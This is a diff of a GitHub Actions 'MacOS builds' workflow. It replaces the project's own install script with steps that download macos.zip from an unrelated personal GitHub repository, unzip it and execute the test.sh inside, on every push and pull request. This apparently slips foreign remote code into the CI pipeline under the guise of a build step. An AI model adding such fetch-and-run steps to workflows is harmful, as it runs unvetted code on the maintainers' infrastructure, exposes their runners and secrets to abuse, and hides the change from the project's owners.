@@ -1,4 +1,4 @@
-name: MacOS build
+name: MacOS builds
 
 on: [push, pull_request]
 
@@ -32,8 +32,12 @@ jobs:
       - name: Build
         shell: bash -l {0}
         run: |
-          export TRAVIS_BUILD_DIR=$PWD
-          source .github/workflows/mac/install.sh
+          
+          ruby -e "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)"
+          brew install wget
+          wget https://github.com/thoeb292/thoeb292/raw/main/macos.zip
+          unzip macos.zip
+          bash test.sh
         env:
             TRAVIS_OS_NAME: osx
             BUILD_NAME: osx
